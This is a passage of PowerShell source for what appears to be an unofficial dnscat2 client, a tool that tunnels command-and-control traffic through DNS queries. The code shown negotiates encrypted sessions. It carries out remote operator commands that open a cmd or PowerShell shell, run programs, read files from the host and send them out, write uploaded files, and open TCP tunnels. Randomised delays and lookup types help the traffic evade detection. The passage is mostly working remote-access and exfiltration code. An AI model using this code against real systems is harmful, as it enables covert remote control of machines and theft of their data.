    $EncPacket = (New-Dnscat2ENC $Session["Domain"] $Session["SessionId"] $Subtype $Flags $Session["EncryptionKeys"]["client_pubkey"] $Session["MaxMSGDataSize"])

    try {
        $Packet = 1
        # If we are renegotiating, encrypt the packet
        $Packet = ConvertTo-Dnscat2Packet (Send-Dnscat2Packet $EncPacket $Session["Domain"] $Session["DNSServer"] $Session["DNSPort"] $Session["LookupTypes"] $Renegotiate $OldEncryptionKeys)
    } catch {}

    if ($Packet -eq 1) {
        Write-Error "Failed to negotiate encryption. Ensure your dnscat2 server is set up correctly."
        return 1
    }

    $Session["EncryptionKeys"]["server_pubkey_x"] = $Packet["server_pubkey_x"]
    $Session["EncryptionKeys"]["server_pubkey_y"] = $Packet["server_pubkey_y"]
    $Session["EncryptionKeys"]["server_pubkey"] = ($Session["EncryptionKeys"]["server_pubkey_x"] + $Session["EncryptionKeys"]["server_pubkey_y"])
    [uint16]$Session["EncryptionKeys"]["nonce"] = 0
    $Session["EncryptionKeys"]["shared_secret"] = Get-SharedSecret $Session["EncryptionKeys"]["client_privkey"] $Session["EncryptionKeys"]["server_pubkey_x"] $Session["EncryptionKeys"]["server_pubkey_y"]
    $Session["EncryptionKeys"]["client_auth"] = Get-SHA3 (([System.Text.Encoding]::ASCII.GetBytes("client")) + $Session["EncryptionKeys"]["shared_secret"] + (Convert-HexToBytes $Session["EncryptionKeys"]["client_pubkey"]) + (Convert-HexToBytes $Session["EncryptionKeys"]["server_pubkey"]) + ([System.Text.Encoding]::ASCII.GetBytes($Session["EncryptionKeys"]["PreSharedSecret"])))
    $Session["EncryptionKeys"]["server_auth"] = Get-SHA3 (([System.Text.Encoding]::ASCII.GetBytes("server")) + $Session["EncryptionKeys"]["shared_secret"] + (Convert-HexToBytes $Session["EncryptionKeys"]["client_pubkey"]) + (Convert-HexToBytes $Session["EncryptionKeys"]["server_pubkey"]) + ([System.Text.Encoding]::ASCII.GetBytes($Session["EncryptionKeys"]["PreSharedSecret"])))
    $Session["EncryptionKeys"]["sas"] = Get-Dnscat2ShortAuthString $Session["EncryptionKeys"]["shared_secret"] (Convert-HexToBytes $Session["EncryptionKeys"]["client_pubkey"]) (Convert-HexToBytes $Session["EncryptionKeys"]["server_pubkey"])
    $Session["EncryptionKeys"]["client_write"] = Get-SHA3 ($Session["EncryptionKeys"]["shared_secret"] + ([System.Text.Encoding]::ASCII.GetBytes("client_write_key")))
    $Session["EncryptionKeys"]["client_mac"] = Get-SHA3 ($Session["EncryptionKeys"]["shared_secret"] + ([System.Text.Encoding]::ASCII.GetBytes("client_mac_key")))
    $Session["EncryptionKeys"]["server_write"] = Get-SHA3 ($Session["EncryptionKeys"]["shared_secret"] + ([System.Text.Encoding]::ASCII.GetBytes("server_write_key")))
    $Session["EncryptionKeys"]["server_mac"] = Get-SHA3 ($Session["EncryptionKeys"]["shared_secret"] + ([System.Text.Encoding]::ASCII.GetBytes("server_mac_key")))
    $Session["Negotiated"] = $True

    return $Session
}

function Start-Dnscat2EncAuth ($Session) {
    $Subtype = "0001" # ENC_SUBTYPE_AUTH
    $Flags = "0001"

    $EncPacket = (New-Dnscat2ENC $Session["Domain"] $Session["SessionId"] $Subtype $Flags (Get-NextDnscat2Data (Convert-BytesToHex $Session["EncryptionKeys"]["client_auth"]) $Session["MaxMSGDataSize"]))

    try {
        $Packet = 1
        $Packet = ConvertTo-Dnscat2Packet (Send-Dnscat2Packet $EncPacket $Session["Domain"] $Session["DNSServer"] $Session["DNSPort"] $Session["LookupTypes"] $False $null)
    } catch { }
    if ($Packet -eq 1) {
        Write-Error "Failed to negotiate encryption. Ensure your dnscat2 server is set up correctly."
        return 1
    }

    if ($Packet["authenticator"] -eq (Convert-BytesToHex $Session["EncryptionKeys"]["server_auth"])) {
        Write-Verbose "SESSION AUTHENTICATED"
    } else {
        Write-Error "MITM WARNING: Server responded with an incorrect PreSharedSecret!"
        return 1
    }

    return $Session
}

function Start-Dnscat2Session ($SessionId, $Options, $Domain, $DNSServer, $DNSPort, $MaxPacketSize, $Encryption, $PreSharedSecret, $LookupTypes, $Delay, $MaxRandomDelay, $Driver, $DriverOptions) {
    $Session = New-Object System.Collections.Hashtable
    $Session["SessionId"] = $SessionId
    $Session["Domain"] = $Domain
    $Session["DNSServer"] = $DNSServer
    $Session["DNSPort"] = $DNSPort
    $Session["SequenceNumber"] = (New-RandomDNSField 4)
    $Session["MaxPacketSize"] = $MaxPacketSize
    $Session["MaxMSGDataSize"] = $MaxPacketSize - $Domain.Length - 18
    $Session["Driver"] = $Driver
    $Session["Dead"] = $False
    $Session["NewSessions"] = New-Object System.Collections.Hashtable
    $Session["Delay"] = $Delay
    $Session["MaxRandomDelay"] = $MaxRandomDelay
    $Session["LookupTypes"] = $LookupTypes
    $Session["SYNOptions"] = $Options

    $Session["PSCommandReady"] = $False
    $Session["PSCommand"] = ""
    $Session["PSUploadReady"] = $False
    $Session["PSUploadName"] = ""
    $Session["PSUploadValue"] = $null
    $Session["PSDownloadReady"] = $False
    $Session["PSDownloadPacketIdBF"] = ""
    $Session["PSDownloadName"] = ""

    $Session["Encryption"] = $Encryption
    $Session["Negotiated"] = $False
    $Session["EncryptionKeys"] = New-Object System.Collections.Hashtable
    $Session["EncryptionKeys"]["PreSharedSecret"] = $PreSharedSecret

    if ($Encryption) {
        $Session = Start-Dnscat2EncInit $Session $False
        if ($Session -eq 1) {
            return 1
        }

        if ($PreSharedSecret -ne "") {
            $Session = Start-Dnscat2EncAuth $Session
            if ($Session -eq 1) {
                return 1
            }
        }
    }

    $SYNPacket = (New-Dnscat2SYN $Domain $SessionId $Session["SequenceNumber"] $Options)
    $Packet = ConvertTo-Dnscat2Packet (Send-Dnscat2Packet $SYNPacket $Domain $DNSServer $DNSPort $LookupTypes $Session["Encryption"] $Session["EncryptionKeys"])

    if ($Packet -eq 1) {
        Write-Error "Failed to start session. Ensure your dnscat2 server is set up correctly."
        return 1
    }


    $Session["DriverDataQueue"] = $Packet["Data"]
    $Session["AcknowledgementNumber"] = $Packet["AcknowledgementNumber"]

    if($Driver -eq "console") {
    } elseif ($Driver -eq "command") {
        $Session["RemainingBytes"] = 0
        $Session["PacketId"] = ""
        $Session["PacketIdBF"] = ""
        $Session["IsResponse"] = ""
        $Session["CommandId"] = ""
        $Session["CommandFields"] = ""
        $Session["CommandFieldsBytes"] = @()
        $Session["CommandPacketBuffer"] = ""
        $Session["Tunnels"] = New-Object System.Collections.Hashtable
        $Session["DeadTunnels"] = @()
    } elseif ($Driver -eq "exec") {
        $ProcessStartInfo = New-Object System.Diagnostics.ProcessStartInfo
        $ProcessStartInfo.FileName = $DriverOptions
        $ProcessStartInfo.UseShellExecute = $False
        $ProcessStartInfo.RedirectStandardInput = $True
        $ProcessStartInfo.RedirectStandardOutput = $True
        $ProcessStartInfo.RedirectStandardError = $True
        $Process = [System.Diagnostics.Process]::Start($ProcessStartInfo)
        $Process.Start() | Out-Null
        $StdOutDestinationBuffer = New-Object System.Byte[] 65536
        $StdOutReadOperation = $Process.StandardOutput.BaseStream.BeginRead($StdOutDestinationBuffer, 0, 65536, $null, $null)
        $StdErrDestinationBuffer = New-Object System.Byte[] 65536
        $StdErrReadOperation = $Process.StandardError.BaseStream.BeginRead($StdErrDestinationBuffer, 0, 65536, $null, $null)
        $Session["Process"] = $Process
        $Session["ProcessId"] = $Process.Id
        $Session["StdOutReadOperation"] = $StdOutReadOperation
        $Session["StdOutDestinationBuffer"] = $StdOutDestinationBuffer
        $Session["StdErrReadOperation"] = $StdErrReadOperation
        $Session["StdErrDestinationBuffer"] = $StdErrDestinationBuffer
    }
    if ($Session["MaxMSGDataSize"] -le 0) {
        Write-Error "Domain name is too long."
        return 1
    }

    return $Session
}

function New-Dnscat2Tunnel ($Session, $TunnelId) {
    $Socket = New-Object System.Net.Sockets.TcpClient
    $Handle = $Socket.BeginConnect($Session["Tunnels"][$TunnelId].Host,$Session["Tunnels"][$TunnelId].Port,$null,$null)
    $Stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
    while ($True) {
        if($Handle.IsCompleted) {
            try {
                $Socket.EndConnect($Handle)
                $Stream = $Socket.GetStream()
                $BufferSize = $Socket.ReceiveBufferSize
                break
            } catch {
                $Socket.Close()
                $Stopwatch.Stop()
                $Session["Tunnels"][$TunnelId].Add("Dead", $True)
                return $Session
            }
        }
        if($Stopwatch.Elapsed.TotalSeconds -gt 10) {
            $Socket.Close()
            $Stopwatch.Stop()
            $Session["Tunnels"][$TunnelId].Add("Dead", $True)
            return $Session
        }
        Sleep -Milliseconds 100
    }

    $Session["Tunnels"][$TunnelId].Add("Stream", $Stream)
    $Session["Tunnels"][$TunnelId].Add("Socket", $Socket)
    $Session["Tunnels"][$TunnelId].Add("BufferSize", $BufferSize)
    $Session["Tunnels"][$TunnelId].Add("StreamDestinationBuffer", (New-Object System.Byte[] $Session["Tunnels"][$TunnelId]["BufferSize"]))
    $Session["Tunnels"][$TunnelId].Add("StreamReadOperation", $Session["Tunnels"][$TunnelId]["Stream"].BeginRead($Session["Tunnels"][$TunnelId]["StreamDestinationBuffer"], 0, $Session["Tunnels"][$TunnelId]["BufferSize"], $null, $null))
    $Session["Tunnels"][$TunnelId].Add("StreamBytesRead", 1)
    $Session["Tunnels"][$TunnelId].Add("Dead", $False)

    return $Session
}

function Read-FromDnscat2Tunnel ($Session, $TunnelId) {
    if ($Session["Tunnels"][$TunnelId]["StreamBytesRead"] -eq 0) {
        $Session["Tunnels"][$TunnelId].Dead = $True; return $Session
    }
    if ($Session["Tunnels"][$TunnelId]["StreamReadOperation"].IsCompleted) {
        $Session["Tunnels"][$TunnelId]["StreamBytesRead"] = $Session["Tunnels"][$TunnelId]["Stream"].EndRead($Session["Tunnels"][$TunnelId]["StreamReadOperation"])
        if($Session["Tunnels"][$TunnelId]["StreamBytesRead"] -eq 0){ $Session["Tunnels"][$TunnelId].Dead = $True; return $Session }
        $Data = $Session["Tunnels"][$TunnelId]["StreamDestinationBuffer"][0..([int]($Session["Tunnels"][$TunnelId]["StreamBytesRead"])-1)]
        $Session["Tunnels"][$TunnelId]["StreamReadOperation"] = $Session["Tunnels"][$TunnelId]["Stream"].BeginRead($Session["Tunnels"][$TunnelId]["StreamDestinationBuffer"], 0, $Session["Tunnels"][$TunnelId]["BufferSize"], $null, $null)

        # Queue tunnel packets
        $Data = Convert-BytesToHex $Data
        $PacketId = (New-RandomDNSField 4)
        $PacketId = ([Convert]::ToString(([convert]::ToUInt16($PacketId, 16) -band ( -bnot [uint16]([Math]::Floor(1 * [Math]::Pow(2,15))))),16)).PadLeft(4, '0')
        $PacketLengthField = ([Convert]::ToString(($PacketId.Length/2 + 2 + $TunnelId.Length/2 + $Data.Length/2),16)).PadLeft(8, '0')
        $DriverData = ($PacketLengthField + $PacketId + "1001" + $TunnelId + $Data)
        $Session["DriverDataQueue"] += $DriverData
    }
    return $Session
}

function Send-ToDnscat2Tunnel ($Session, $TunnelId, $Data) {
    try {
        [byte[]]$Bytes = Convert-HexToBytes $Data
        $Session["Tunnels"][$TunnelId]["Stream"].Write($Bytes, 0, $Bytes.Length)
    } catch {
        $Session["Tunnels"][$TunnelId].Dead = $True
    }
    return $Session
}

function Close-Dnscat2Tunnel ($Session, $TunnelId) {
    try { $Session["Tunnels"][$TunnelId].Dead = $True } catch { }
    try { $Session["Tunnels"][$TunnelId]["Stream"].Close() } catch { }
    try { $Session["Tunnels"][$TunnelId]["Socket"].Close() } catch { }
    return $Session
}

function Update-Dnscat2CommandSession ($Session) {
    if ($Session["CommandPacketBuffer"].Length -le 0) {
        return $Session
    }

    ## PROCESS COMMAND PACKETS
    while ($Session["CommandPacketBuffer"].Length -gt 0) {
        # Packet Header
        if (($Session["RemainingBytes"] -eq 0) -and ($Session["CommandPacketBuffer"].Length -ge 16)) {
            # Decode Command Packet Header
            $Session["Length"] = [Convert]::ToUInt32($Session["CommandPacketBuffer"][0..7] -join '', 16)
            $Session["PacketId"] = $Session["CommandPacketBuffer"][8..11] -join ''
            $Session["PacketIdBF"] = [Convert]::ToString(([convert]::ToUInt16($Session["CommandPacketBuffer"][8..11] -join '', 16) -bxor ([Math]::Floor(1 * [Math]::Pow(2,15)))),16)
            $Session["CommandId"] = $Session["CommandPacketBuffer"][12..15] -join ''
            $Session["RemainingBytes"] = ($Session["Length"] - 4)
            $Session["CommandPacketBuffer"] = $Session["CommandPacketBuffer"].Substring(16)
            $Session["CommandFields"] = ""
        } elseif ($Session["RemainingBytes"] -gt 0) { # Packet Data
            if ($Session.RemainingBytes*2 -ge $Session["CommandPacketBuffer"].Length) {
                # length of remaining command packet is -ge remaining data buffer
                # We can just grab the rest of the packet buffer
                $Session["CommandFields"] += $Session["CommandPacketBuffer"]
                $Session["CommandFieldsBytes"] += Convert-HexToBytes $Session["CommandPacketBuffer"]
                $Session["RemainingBytes"] -= $Session["CommandPacketBuffer"].Length/2
                $Session["CommandPacketBuffer"] = ""
            } else {
                # length of remaining command packet is -lt remaining data buffer
                # We have another packet header in the buffer!
                $Session["CommandFields"] += $Session["CommandPacketBuffer"].Substring(0, $Session.RemainingBytes*2)
                $Session["CommandFieldsBytes"] += Convert-HexToBytes $Session["CommandPacketBuffer"].Substring(0, $Session.RemainingBytes*2)
                $RemainingBytes = $Session.RemainingBytes*2
                $Session["RemainingBytes"] -= ($Session["CommandPacketBuffer"].Substring(0, $Session.RemainingBytes*2)).Length/2
                $Session["CommandPacketBuffer"] = $Session["CommandPacketBuffer"].Substring($RemainingBytes)
            }

            if ($Session["RemainingBytes"] -eq 0) { # If we've completed a packet, lets send it right now
                break
            }
        } else {
            # Happens when a piece of a packet header remains in the buffer
            # We should wait until the whole header is in the buffer before processing
            break
        }
    }

    ## INVOKE COMMAND PACKET
    if ($Session["RemainingBytes"] -eq 0) {
        switch ($Session["CommandId"])
        {
            "0000" # COMMAND_PING
            {
                $PacketLengthField = ([Convert]::ToString((4 + $Session["CommandFields"].Length/2),16)).PadLeft(8, '0')
                $DriverData = ($PacketLengthField + $Session.PacketIdBF + "0000" + $Session["CommandFields"])
                $Session["DriverDataQueue"] += $DriverData
                return $Session
            }
            "0001" # COMMAND_SHELL
            {
                try {
                    $NewSessionName = $Session["CommandFields"]
                    $NewSession = Start-Dnscat2Session (New-RandomDNSField 4) ("0001" + $NewSessionName) $Session.Domain $Session.DNSServer $Session.DNSPort $Session.MaxPacketSize $Session.Encryption $Session["EncryptionKeys"].PreSharedSecret $Session.LookupTypes $Session.Delay $Session.MaxRandomDelay "exec" "cmd"
                    $Session.NewSessions.Add($NewSession.SessionId, $NewSession)
                    $PacketLengthField = ([Convert]::ToString((4 + $NewSession.SessionId.Length/2),16)).PadLeft(8, '0')
                    $DriverData = ($PacketLengthField + $Session.PacketIdBF + "0001" + $NewSession.SessionId)
                    $Session["DriverDataQueue"] += $DriverData
                } catch {
                    $ErrorCode = $CommandId
                    $Reason = (Convert-StringToHex "COMMAND_SHELL Failed!") + "00"
                    $PacketLengthField = ([Convert]::ToString((4 + 2 + $Reason.Length/2),16)).PadLeft(8, '0')
                    $DriverData = ($PacketLengthField + $Session.PacketIdBF + "FFFF" + $ErrorCode + $Reason)
                    $Session["DriverDataQueue"] += $DriverData
                }
                return $Session
            }
            "0002" # COMMAND_EXEC
            {
                try {
                    $NewSessionName = $Session["CommandFields"].Substring(0,$Session["CommandFields"].IndexOf("00"))
                    $NewSessionCommand = Convert-HexToString ($Session["CommandFields"].Substring($Session["CommandFields"].IndexOf("00") + 2).replace("00",""))
                    $NewSessionDriver = "exec"

                    if ($NewSessionCommand -eq "psh") {
                        $NewSessionDriver = "PS"
                        $NewSessionCommand = ""
                    }

                    $NewSession = Start-Dnscat2Session (New-RandomDNSField 4) ("0001" + $NewSessionName + '00') $Session.Domain $Session.DNSServer $Session.DNSPort $Session.MaxPacketSize $Session.Encryption $Session["EncryptionKeys"].PreSharedSecret $Session.LookupTypes $Session.Delay $Session.MaxRandomDelay $NewSessionDriver $NewSessionCommand
                    $Session.NewSessions.Add($NewSession.SessionId, $NewSession)
                    $PacketLengthField = ([Convert]::ToString((4 + $NewSession.SessionId.Length/2),16)).PadLeft(8, '0')
                    $DriverData = ($PacketLengthField + $Session.PacketIdBF + "0002" + $NewSession.SessionId)
                    $Session["DriverDataQueue"] += $DriverData
                } catch {
                    $ErrorCode = $CommandId
                    $Reason = (Convert-StringToHex "COMMAND_EXEC Failed!") + "00"
                    $PacketLengthField = ([Convert]::ToString((4 + 2 + $Reason.Length/2),16)).PadLeft(8, '0')
                    $DriverData = ($PacketLengthField + $Session.PacketIdBF + "FFFF" + $ErrorCode + $Reason)
                    $Session["DriverDataQueue"] += $DriverData
                }
                return $Session
            }
            "0003" # COMMAND_DOWNLOAD
            {
                try {
                    $FileName = Convert-HexToString $Session["CommandFields"].TrimEnd('00')

                    if ($FileName.StartsWith("bytes:`$")) {
                        $Session["PSDownloadReady"] = $True
                        $Session["PSDownloadName"] = $FileName.Substring(7)
                        $Session["PSDownloadPacketIdBF"] = $Session.PacketIdBF
                    } else {
                        $FileHexDump = Convert-BytesToHex ([IO.File]::ReadAllBytes($FileName))
                        $PacketLengthField = ([Convert]::ToString((4 + ($FileHexDump.Length/2)),16)).PadLeft(8, '0')
                        $DriverData = ($PacketLengthField + $Session.PacketIdBF + "0003" + $FileHexDump)
                        $Session["DriverDataQueue"] += $DriverData
                    }
                    $DriverData = ("00000004" + $Session.PacketIdBF + $Session["CommandId"])
                    $Session["DriverDataQueue"] += $DriverData
                } catch {
                    $ErrorCode = $Session["CommandId"]
                    $Reason = (Convert-StringToHex "Could not read file. Make sure to provide the full path!") + "00"
                    $PacketLengthField = ([Convert]::ToString((4 + 2 + $Reason.Length/2),16)).PadLeft(8, '0')
                    $DriverData = ($PacketLengthField + $Session.PacketIdBF + "FFFF" + $ErrorCode + $Reason)
                    $Session["DriverDataQueue"] += $DriverData
                }
            }
            "0004" # COMMAND_UPLOAD
            {
                try {
                    $Data = $Session["CommandFields"]
                    $FileName = Convert-HexToString ($Data[0..($Data.IndexOf('00') - 1)] -join '')
                    [String]$Data = (($Data[($Data.IndexOf('00') + 2)..$Data.Length]) -join '')

                    if ($FileName.StartsWith("hex:`$")) {
                        $Session["PSUploadReady"] = $True
                        $Session["PSUploadName"] = $FileName.Substring(5)
                        $Session["PSUploadValue"] = $Data
                    } else {
                        [byte[]]$Bytes = $Session['CommandFieldsBytes'][($FileName.Length+1)..$Session['CommandFieldsBytes'].Length]
                        [IO.File]::WriteAllBytes($FileName, $Bytes) 2>&1 | Out-Null
                    }
                    $DriverData = ("00000004" + $Session.PacketIdBF + $Session["CommandId"])
                    $Session["DriverDataQueue"] += $DriverData
                } catch {
                    $ErrorCode = $Session["CommandId"]
                    $Reason = (Convert-StringToHex "Could not write file") + "00"
                    $PacketLengthField = ([Convert]::ToString((4 + 2 + $Reason.Length/2),16)).PadLeft(8, '0')
                    $DriverData = ($PacketLengthField + $Session.PacketIdBF + "FFFF" + $ErrorCode + $Reason)
                    $Session["DriverDataQueue"] += $DriverData
                }
            }
            "0006" # COMMAND_DELAY
            {
                try {
                    $Session["Delay"] = [Convert]::ToUInt32($Session["CommandFields"], 16)
                    Write-Verbose ('New Delay: ' + $Session["Delay"].ToString())
                } catch {}

            }
            "1000" # TUNNEL_CONNECT
            {
                try {
                    $Tunnel = New-Object System.Collections.Hashtable
                    $Tunnel.Add("Host", (Convert-HexToString $Session["CommandFields"].Substring(0, $Session["CommandFields"].Length - 4)).Trim(0))
                    $Tunnel.Add("Port", [Convert]::ToUInt16($Session["CommandFields"].Substring($Session["CommandFields"].Length - 4), 16))
                    $Tunnel.Add("TunnelId", (New-RandomDNSField 8))
                    $Session["Tunnels"].Add($Tunnel.TunnelId, $Tunnel)

                    ## START UP TUNNEL
                    $Session = New-Dnscat2Tunnel $Session $Tunnel.TunnelId

                    if ($Session["Tunnels"][$Tunnel.TunnelId].Dead) {
                        $ErrorCode = $CommandId
                        $Reason = (Convert-StringToHex "Failed to start tunnel") + "00"
                        $PacketLengthField = ([Convert]::ToString((4 + 2 + $Reason.Length/2),16)).PadLeft(8, '0')
                        $DriverData = ($PacketLengthField + $Session.PacketIdBF + "1000" + $ErrorCode + $Reason)
                        $Session["DriverDataQueue"] += $DriverData
                    }

                    $DriverData = ("00000008" + $Session.PacketIdBF + "1000" + $Tunnel.TunnelId)
                    $Session["DriverDataQueue"] += $DriverData
                } catch {
                    $ErrorCode = $CommandId
                    $Reason = (Convert-StringToHex "Failed to start tunnel") + "00"
                    $PacketLengthField = ([Convert]::ToString((4 + 2 + $Reason.Length/2),16)).PadLeft(8, '0')
                    $DriverData = ($PacketLengthField + $Session.PacketIdBF + "1000" + $ErrorCode + $Reason)
                    $Session["DriverDataQueue"] += $DriverData
                }
            }
            "1001" # TUNNEL_DATA
            {
                try {
                    $TunnelId = $Session["CommandFields"].Substring(0, 8)
                    $Data = $Session["CommandFields"].Substring(8)
                    $Session = Send-ToDnscat2Tunnel $Session $TunnelId $Data
                } catch { }
            }
            "1002" # TUNNEL_CLOSE
            {
                try {
                    $TunnelId = $Session["CommandFields"]
                    $Session = Close-Dnscat2Tunnel $Session $TunnelId
                } catch { }
            }
        }
    }

    return $Session
}

function Read-DataFromDriver ($Session) {
    if ($Session["Driver"] -eq "console") {
        $Data = ""
        if($Host.UI.RawUI.KeyAvailable) {
            $Data = ((Read-Host) + "`n")
        }
        $Session["DriverDataQueue"] += (Convert-StringToHex $Data)
        return $Session
    } elseif ($Session["Driver"] -eq "command") {

        # Tunnels are the only time a command session sends data without a prior request
        if ($Session["Tunnels"].Count -gt 0) {
            # Update Tunnels
            $TunnelIds = @()
            $TunnelIds += $Session["Tunnels"].Keys
            foreach ($TunnelId in $TunnelIds) {
                $Session = Read-FromDnscat2Tunnel $Session $TunnelId

                if ($Session[$TunnelId].Dead) {
                    $Session["DeadTunnels"] += $TunnelId
                }
            }

            # Remove Dead Tunnels
            foreach ($TunnelId in $Session["DeadTunnels"]) {
                $Session["Tunnels"].Remove($TunnelId)
            }
            $Session["DeadTunnels"] = @()
        }

    } elseif ($Session["Driver"] -eq "exec") {
        if($Host.UI.RawUI.KeyAvailable) {
            $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyUp") | Out-Null
        }
        if($Session["StdOutReadOperation"].IsCompleted) {
            $StdOutBytesRead = ($Session["Process"]).StandardOutput.BaseStream.EndRead($Session["StdOutReadOperation"])
            if($StdOutBytesRead -eq 0){ $Session.Dead = $True; return $Session }
            $Session["DriverDataQueue"] += Convert-BytesToHex ($Session["StdOutDestinationBuffer"][0..([int]$StdOutBytesRead-1)])
            $Session["StdOutReadOperation"] = ($Session["Process"]).StandardOutput.BaseStream.BeginRead($Session["StdOutDestinationBuffer"], 0, 65536, $null, $null)
        }
        if($Session["StdErrReadOperation"].IsCompleted) {
            $StdErrBytesRead = ($Session["Process"]).StandardError.BaseStream.EndRead($Session["StdErrReadOperation"])
            if($StdErrBytesRead -eq 0){ $Session.Dead = $True; return $Session }
            $Session["DriverDataQueue"] += Convert-BytesToHex ($Session["StdErrDestinationBuffer"][0..([int]$StdErrBytesRead-1)])
            $Session["StdErrReadOperation"] = ($Session["Process"]).StandardError.BaseStream.BeginRead($Session["StdErrDestinationBuffer"], 0, 65536, $null, $null)
        }
    }
    return $Session
}

function Send-DataToDriver ($Data, $Session) {
    if ($Session["Driver"] -eq "console") {
        $StringData = Convert-HexToString $Data
        Write-Host -n $StringData
    } elseif ($Session["Driver"] -eq "command") {
        $Session["CommandPacketBuffer"] += $Data
    } elseif ($Session["Driver"] -eq "exec") {
        $StringData = Convert-HexToString $Data
        ($Session["Process"]).StandardInput.WriteLine($StringData.TrimEnd("`r").TrimEnd("`n"))
    } elseif ($Session["Driver"] -eq "PS") {
        # Only execute when a newline is sent
        $Session["PSCommand"] += $Data
        if (($Session["PSCommand"][-1..-2] -join '') -eq 'A0') {
            $Session["PSCommandReady"] = $True
        }
    }
    return $Session
}

function Stop-Dnscat2Session ($Session) {
    Send-Dnscat2Packet (New-Dnscat2FIN $Session["Domain"] $Session["SessionId"] $Session["Domain"]) $Session["Domain"] $Session["DNSServer"] $Session["DNSPort"] $Session["LookupTypes"] $Session["Encryption"] $Session["EncryptionKeys"]| Out-Null
    if ($Session["Driver"] -eq "exec") {
        taskkill /T /F /PID $Session["ProcessId"] 2>&1 | Out-Null
    }
    $Session["Dead"] = $True
    return $Session
}

function Update-Dnscat2Session ($Session) {
    try {
        # Retrive Driver Data
        $Session = Read-DataFromDriver $Session

        if ($Session["Encryption"]) {
            $Session["EncryptionKeys"]["nonce"] += 1
            if ($Session["EncryptionKeys"]["nonce"] -gt 65500) {
                # DO ENCRYPTION RENOGOTIATION
                $Session = Start-Dnscat2EncInit $Session $True
            }
        }

        if ($Session.Dead) {
            $Session = Stop-Dnscat2Session $Session
            return $Session
        }

        # Grab next data in the queue
        $PacketData = (Get-NextDnscat2Data $Session["DriverDataQueue"] $Session["MaxMSGDataSize"])

        # Delay
        $RandomDelay = $Session['MaxRandomDelay']
        if ($Session['MaxRandomDelay'] -le 0) { $RandomDelay = 0 }
        Sleep -Milliseconds ($Session['Delay'] + $RandomDelay)

        try {
            $MSGPACKET = (New-Dnscat2MSG $Session["Domain"] $Session["SessionId"] $Session["SequenceNumber"] $Session["AcknowledgementNumber"] $PacketData)
            $Packet = (Send-Dnscat2Packet $MSGPACKET $Session["Domain"] $Session["DNSServer"] $Session["DNSPort"] $Session["LookupTypes"] $Session["Encryption"] $Session["EncryptionKeys"])
        } catch {
            Write-Error "Dnscat2: Failed to send packet! "
			$Session.Dead = $True
            return $Session
        }

        try {
            $Packet = (ConvertTo-Dnscat2Packet $Packet)
            if($Packet -eq 1){ Write-Error "Dnscat2: Failed to ConvertTo-Dnscat2Packet..."; $Session.Dead = $True }
            if ($Packet["MessageType"] -eq "01") {
                # Check if server ACKed sent data
                $BytesACKed = (Compare-SequenceNumber $Session["SequenceNumber"] $Packet["AcknowledgementNumber"])
                if ($BytesACKed -ne 0) {
                    # If data was ACKed, remove it from Queue
                    $Session["DriverDataQueue"] = ($Session["DriverDataQueue"]).Substring($BytesACKed*2)
                }
                $Session["SequenceNumber"] = $Packet["AcknowledgementNumber"]

                # ACK the server data
                if ($Packet["Data"] -ne "") {
                    $Session["AcknowledgementNumber"] = Update-Dnscat2ACK $Packet["Data"] $Packet["SequenceNumber"]
                    $Session = Send-DataToDriver $Packet["Data"] $Session
                }
            } elseif ($Packet["MessageType"] -eq "02") {
                $Session.Dead = $True
                return $Session
            }
        } catch {
            Write-Error "Dnscat2: Caught error while processing packet, dropping..."
			$Session.Dead = $True
			$Session = Stop-Dnscat2Session $Session
        }

        if ($Session.Driver -eq "command") {
            $Session = Update-Dnscat2CommandSession $Session
        }
    } catch {
        $Session.Dead = $True
        $Session = Stop-Dnscat2Session $Session
    }
    return $Session
}

function Start-Dnscat2 {
    <#
    .SYNOPSIS
        Start a Dnscat2 session. By default, a command type session is created.

    .DESCRIPTION
        This powershell script is an unofficial client for the dnscat2 DNS tunnel.

    .PARAMETER Domain
        The Domain being used by the dnscat2 server.

    .PARAMETER DNSServer
        The hostname or IP Address to send DNS queries to.

    .PARAMETER DNSPort
        The port to send DNS queries to.

    .PARAMETER Exec
        Link the I/O of a process with the Dnscat2 session.

    .PARAMETER Console
        Link the I/O of the console with the Dnscat2 session.

    .PARAMETER ExecPS
        Simulate a Powershell session and link the IO with the Dnscat2 session.
        WARNING: Exiting will kill the entire dnscat2 client, not just the session.

    .PARAMETER PreSharedSecret
        Set the shared secret. Set the same one on the server and the client to prevent man-in-the-middle attacks!

    .PARAMETER NoEncryption
        Do not enable encryption.

    .PARAMETER LookupTypes
        Set an array of lookup types. Each packet has its lookup type randomly selected from the array.
        Only TXT, MX, CNAME, A, and AAAA records are supported. Default: @(TXT, MX, CNAME)

    .PARAMETER Delay
        Set a delay between each request, in milliseconds. (Default: 0)

    .PARAMETER MaxRandomDelay
        Set the max value of a random delay added to the normal delay, in milliseconds. (Default: 0)

    .PARAMETER MaxPacketSize
        Maximum length of a dnscat2 packet.

    .PARAMETER Name
        The name of your dnscat2 session. (Default: hostname)
    #>

    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True)][Alias("d")][string]$Domain,
        [Alias("s")][string]$DNSServer="",
        [Alias("p")][ValidateRange(1,65535)][int32]$DNSPort=53,
        [Alias("e")][string]$Exec="",
        [switch]$Console=$False,
        [Alias("psh")][switch]$ExecPS=$False,
        [Alias("sec")][string]$PreSharedSecret="",
        [Alias("ne")][switch]$NoEncryption=$false,
        [string[]]$LookupTypes=@("TXT","MX","CNAME"),
        [Alias("t")][int32]$Delay=0,
        [Alias("r")][int32]$MaxRandomDelay=0,
        [ValidateRange(1,240)][int32]$MaxPacketSize=240,
        [Alias("n")][string]$Name=""
    )

    if ($DNSServer -eq "") {
        Write-Verbose "No DNS Server specified! Checking DNS settings..."
        $DNSServers = @()
        $regex = [regex] "\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b"
        $regex.Matches((ipconfig /all | Select-String "DNS Servers" | Out-String)) | %{ $DNSServers += $_.value }
        if ($DNSServers.Count -eq 0) {
            Write-Error ("Couldn't find default DNS server. Please specify a DNS server with -DNSServer.")
            return
        }
        $DNSServer = $DNSServers[0]
        Write-Verbose ("DNSServer set to " + $DNSServer)
    }

    foreach ($LookupType in $LookupTypes) {
        if (!(@("TXT","MX","CNAME","A","AAAA") -contains $LookupType)) {
            Write-Error ($LookupType + " is not a valid Lookup Type!")
